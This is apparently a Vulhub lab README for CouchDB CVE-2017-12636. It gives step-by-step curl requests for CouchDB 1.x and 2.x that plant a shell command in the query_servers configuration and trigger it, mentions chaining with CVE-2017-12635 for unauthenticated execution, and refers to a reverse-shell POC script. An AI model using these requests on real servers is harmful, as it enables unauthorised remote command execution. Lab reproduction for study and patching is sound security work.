# Couchdb Arbitrary Command Execution (CVE-2017-12636)

[中文版本(Chinese version)](README.zh-cn.md)

Apache CouchDB is an open-source document-oriented NoSQL database, implemented in Erlang. CouchDB uses multiple formats and protocols to store, transfer, and process its data. It uses JSON to store data, JavaScript as its query language using MapReduce, and HTTP for an API.

CouchDB administrative users can configure the database server via HTTP(S). Some of the configuration options include paths for operating system-level binaries that are subsequently launched by CouchDB. This allows an admin user in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to execute arbitrary shell commands as the CouchDB user, including downloading and executing scripts from the public internet.

Chain [CVE-2017-12635](../CVE-2017-12635) and CVE-2017-12636 to get a unauthenticated remote command execution.

## Vulnerable Environment

API interfaces of Couchdb 2.x and and 1.x are somewhat different, so this vulnerability is exploited in a different way. This environment is about version 1.6.0, if you want to test version 2.1.0, you can use the [CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635).

Start a Couchdb 1.6.0 server.

```
docker-compose up -d
```

After the startup is complete, browse ``http://your-ip:5984/`` to see the welcome page of Couchdb.

## Exploit explanation

CVE-2017-12636 is a post-authentication RCE, so if you do not know the target administrator password, you can use [CVE-2017-12635](https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635) to add an administrator user first.

### Exploit under 1.x

Execute the following requests in sequence to trigger arbitrary command execution.

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id": "770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language": "cmd", "map":""}' -H 'Content-Type: application/json'
```

Here, `vulhub:vulhub` is the administrator account and password.

The first request is to add a **query_servers** with the name `cmd` and the value `"id >/tmp/success"`, which is the command we are going to execute later.

The second and third requests are to add a database and document, which can be queried only after it is added here.

The fourth request is to do a query in this Database, a **query_servers** named `cmd` that I added in the first step is used, and finally trigger the command execution.

### Exploit under 2.x

The two APIs I used above have been modified in 2.1.0 and need to be explained in detail here.

Couchdb 2.x introduces clustering, browser the `/_membership` to get the node list.

```
curl http://vulhub:vulhub@your-ip:5984/_membership
```

![](1.png)

As you can see, we have only one node here, with the name `nonode@nohost`.

Then, modify the configuration of node `nonode@nohost` as follows.

```
curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/success"'
```

Then, in the same way as the 1.6.0 exploit:

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id": "770895a97726d5ca6d70a22173005c7b"}'
```

Couchdb 2.x removed `_temp_view`, so we need to add a `_view` in order to trigger the command defined in `query_servers`:

```
curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test", "views":{"woyun":{"map":""} }," language": "cmd"}' -H "Content-Type: application/json"
```

Then commands in `query_servers` will be executed.

## POC script

I wrote a simple POC [exp.py](exp.py), modified the target and command inside the script to your test target, then modified the version to the corresponding Couchdb version (1 or 2), and successfully get the reverse shell:
